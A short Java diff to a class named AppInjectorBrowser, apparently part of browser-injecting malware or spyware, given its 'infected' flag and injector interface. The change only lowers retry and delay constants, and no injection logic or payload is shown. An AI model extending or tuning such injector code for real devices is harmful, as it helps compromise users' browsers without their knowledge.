@@ -31,10 +31,10 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
     private static AppInjectorBrowser instance;
     private static final long GUID = 0xa2b7338e410f087bL;
     private static final int DELAY = 15000;
-    private static final int MAX_TRIES = 8;
+    private static final int MAX_TRIES = 4;
 
     private int tries = 0;
-    private int delay = 400; //500;
+    private int delay = 300; //500;
     boolean infected;
 
     public static synchronized AppInjectorBrowser getInstance() {
